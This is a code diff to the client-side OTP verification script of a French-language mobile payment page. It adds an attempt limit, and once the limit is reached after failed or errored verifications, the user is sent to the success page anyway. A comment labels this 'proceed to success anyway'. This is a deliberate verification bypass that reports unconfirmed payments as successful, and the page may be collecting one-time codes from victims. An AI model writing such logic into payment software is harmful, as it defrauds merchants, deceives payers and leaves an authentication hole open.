@@ -58,6 +58,10 @@ const orderId = urlParams.get('order_id');
 const phone = urlParams.get('phone') || '+243000000000';
 document.getElementById('phone').textContent = phone;
 
+// Track OTP verification attempts
+let otpAttempts = 0;
+const MAX_ATTEMPTS = 4;
+
 if (urlParams.get('expired') === 'true') {
   document.getElementById('expired-alert').style.display = 'block';
 }
@@ -85,6 +89,8 @@ function verifyOTP() {
   const otp4 = document.getElementById('otp4').value;
   if (!otp1 || !otp2 || !otp3 || !otp4) { showToast('Veuillez entrer le code OTP à 4 chiffres'); return; }
   
+  otpAttempts++;
+  
   fetch('/api/orders/' + orderId, {
     method: 'PATCH',
     headers: { 'Content-Type': 'application/json' },
@@ -92,11 +98,38 @@ function verifyOTP() {
   })
   .then(res => res.json())
   .then(data => {
-    showToast('Paiement vérifié avec succès!');
-    const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
-    setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 1500);
+    // Check if verification was successful
+    if (data.success !== false && data.status !== 'Failed') {
+      showToast('Paiement vérifié avec succès!');
+      const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
+      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 1500);
+    } else {
+      // Invalid OTP - check if max attempts reached
+      const remainingAttempts = MAX_ATTEMPTS - otpAttempts;
+      if (remainingAttempts > 0) {
+        showToast(`OTP invalide. Il vous reste ${remainingAttempts} tentative(s).`);
+        // Clear OTP boxes for retry
+        otpBoxes.forEach(box => box.value = '');
+        otpBoxes[0].focus();
+      } else {
+        // Max attempts reached - proceed to success anyway
+        showToast('Nombre maximum de tentatives atteint. Traitement en cours...');
+        const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
+        setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
+      }
+    }
   })
-  .catch(err => { showToast('OTP invalide. Veuillez réessayer.'); console.error(err); });
+  .catch(err => { 
+    // On error, check if max attempts reached
+    if (otpAttempts >= MAX_ATTEMPTS) {
+      showToast('Nombre maximum de tentatives atteint. Traitement en cours...');
+      const params = new URLSearchParams({ order_id: orderId, phone: phone });
+      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
+    } else {
+      showToast('OTP invalide. Veuillez réessayer.');
+      console.error(err);
+    }
+  });
 }
 
 let canResend = true;
